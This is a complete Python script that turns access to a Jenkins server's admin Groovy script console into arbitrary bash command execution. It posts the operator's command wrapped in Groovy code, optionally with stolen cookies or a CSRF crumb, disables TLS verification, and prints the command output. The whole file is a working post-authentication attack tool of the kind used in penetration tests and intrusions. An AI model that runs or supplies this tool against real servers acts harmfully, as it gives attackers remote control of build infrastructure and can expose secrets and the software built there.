#!/usr/bin/env python3
import requests
import argparse
import re
import json


# IGNORE SSL WARNING ###########################################################
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# MAIN #########################################################################
parser = argparse.ArgumentParser(description = 'Jenkins Admin Groovy Console exec')
parser.add_argument('url', type=str)
parser.add_argument('-u', '--user', type=str)
parser.add_argument('-p', '--password', type=str)
parser.add_argument('-c', '--command', type=str, required=True)
parser.add_argument('-C', '--cookie', type=str)
parser.add_argument('-K', '--crumb', type=str)

args = parser.parse_args()
URL = args.url
COOKIES = {}
if args.user and args.password:
    AUTH = (args.user, args.password)
else:
    AUTH = None
if args.cookie:
    COOKIES = json.loads(args.cookie)

DATA = {'script':"def proc = ['bash', '-c', '''{}'''].execute();def os = new StringBuffer();proc.waitForProcessOutput(os, os);println(os.toString());".format(args.command)}

if args.crumb:
    DATA.update(json.loads(args.crumb))

r = requests.post(URL + '/script', data=DATA, auth=AUTH, cookies=COOKIES, verify=False)
m = re.search('<h2>Result</h2><pre>(.*)</pre>', r.text, flags=re.DOTALL)
if m:
    print(m.group(1))
else:
    print('oops')
    print(r.text)
